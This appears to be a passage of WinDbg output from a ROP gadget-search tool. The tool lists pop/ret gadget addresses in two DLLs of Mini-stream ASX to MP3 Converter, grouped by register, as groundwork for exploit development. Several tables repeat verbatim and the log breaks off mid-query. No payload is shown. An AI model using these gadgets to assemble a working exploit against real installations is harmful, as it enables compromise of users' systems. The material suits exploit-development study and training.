0x10012443  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop edi ; ret
0x10028FDB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebx ; ret
0x1005BE44  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebp ; ret
0x03E51AC9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; ret          
0x03E51148  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=ebx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebx ; ret          
0x03E51030  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=esi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esi ; ret          
0x03E541A9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ecx ; ret
0x03E511B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ebx ; ret
0x03E51324  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebx ; ret
0x03E5102F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop esi ; ret
@$osed().rop.query("capability", "LOAD_REGISTER", "ebx")                 : ROP Query: 28 rows
    title            : ROP Query
    rows             : ROP Query: 28 rows; expand rows[N] for details
    length           : 0x1c
0:000> dx @$osed().rop.query("capability", "LOAD_REGISTER", "esi")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               
----------  -------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------
0x1002A649  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=eax, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop eax ; ret          
0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edx ; ret          
0x10018B89  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  70     RETURN      exact(exact=esp)  exact(exact=esp)            exact(exact=[esp])  none          unknown          LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esp ; ret          
0x1001062D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=ebp, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebp ; ret          
0x10012444  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edi ; ret          
0x1002F696  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop ebp ; ret
0x1003023B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop esi ; ret
0x10028E7D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; pop ecx ; ret
0x1005C16F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebx ; ret
0x10032CB4  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebp ; ret
0x10029A70  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop esi ; ret
0x10031659  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, eax, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop eax ; ret
0x1002A0B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ebp ; ret
0x1001A41B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop esi ; ret
0x1001D0DD  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop edi ; ret
0x1001096D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ecx ; ret
0x100176E2  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ecx ; ret
0x1001062C  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebp ; ret
0x10012443  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop edi ; ret
0x10028FDB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebx ; ret
0x1005BE44  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebp ; ret
0x03E51AC9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; ret          
0x03E51148  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=ebx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebx ; ret          
0x03E51030  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=esi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esi ; ret          
0x03E541A9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ecx ; ret
0x03E511B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ebx ; ret
0x03E51324  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebx ; ret
0x03E5102F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop esi ; ret
@$osed().rop.query("capability", "LOAD_REGISTER", "esi")                 : ROP Query: 28 rows
    title            : ROP Query
    rows             : ROP Query: 28 rows; expand rows[N] for details
    length           : 0x1c
0:000> dx @$osed().rop.query("capability", "LOAD_REGISTER", "ecx")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               
----------  -------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------
0x1002A649  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=eax, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop eax ; ret          
0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edx ; ret          
0x10018B89  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  70     RETURN      exact(exact=esp)  exact(exact=esp)            exact(exact=[esp])  none          unknown          LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esp ; ret          
0x1001062D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=ebp, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebp ; ret          
0x10012444  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edi ; ret          
0x1002F696  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop ebp ; ret
0x1003023B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop esi ; ret
0x10028E7D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; pop ecx ; ret
0x1005C16F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebx ; ret
0x10032CB4  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebp ; ret
0x10029A70  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop esi ; ret
0x10031659  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, eax, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop eax ; ret
0x1002A0B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ebp ; ret
0x1001A41B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop esi ; ret
0x1001D0DD  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop edi ; ret
0x1001096D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ecx ; ret
0x100176E2  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ecx ; ret
0x1001062C  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebp ; ret
0x10012443  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop edi ; ret
0x10028FDB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebx ; ret
0x1005BE44  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebp ; ret
0x03E51AC9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; ret          
0x03E51148  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=ebx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebx ; ret          
0x03E51030  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=esi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esi ; ret          
0x03E541A9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ecx ; ret
0x03E511B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ebx ; ret
0x03E51324  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebx ; ret
0x03E5102F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop esi ; ret
@$osed().rop.query("capability", "LOAD_REGISTER", "ecx")                 : ROP Query: 28 rows
    title            : ROP Query
    rows             : ROP Query: 28 rows; expand rows[N] for details
    length           : 0x1c
0:000> dx @$osed().rop.query("writes", "edx")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads             Writes                 MemoryReads         MemoryWrites  StackDelta      Capabilities                                            Sequence     
----------  -------------------------------------------------------------------  -----  ----------  ----------------  ---------------------  ------------------  ------------  --------------  ------------------------------------------------------  -------------
0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)  exact(exact=[esp])  none          exact(exact=8)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edx ; ret
@$osed().rop.query("writes", "edx")                 : ROP Query: 1 row
    title            : ROP Query
    rows             : ROP Query: 1 row; expand rows[N] for details
    length           : 0x1
```

```text
0:000> dx @$osed().rop.query("writes", "ecx")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               
----------  -------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------
0x10028E7D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; pop ecx ; ret
0x1005C16F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebx ; ret
0x10032CB4  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebp ; ret
0x10029A70  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop esi ; ret
0x1001096D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ecx ; ret
0x100176E2  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ecx ; ret
0x03E51AC9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  85     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; ret          
0x03E541A9  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ecx ; ret
@$osed().rop.query("writes", "ecx")                 : ROP Query: 8 rows
    title            : ROP Query
    rows             : ROP Query: 8 rows; expand rows[N] for details
    length           : 0x8
0:000> dx @$osed().rop.query("writes", "edx")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads             Writes                 MemoryReads         MemoryWrites  StackDelta      Capabilities                                            Sequence     
----------  -------------------------------------------------------------------  -----  ----------  ----------------  ---------------------  ------------------  ------------  --------------  ------------------------------------------------------  -------------
0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)  exact(exact=[esp])  none          exact(exact=8)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edx ; ret
@$osed().rop.query("writes", "edx")                 : ROP Query: 1 row
    title            : ROP Query
    rows             : ROP Query: 1 row; expand rows[N] for details
    length           : 0x1
0:000> dx @$osed().rop.query("writes", "eax")

=== ROP Query ===
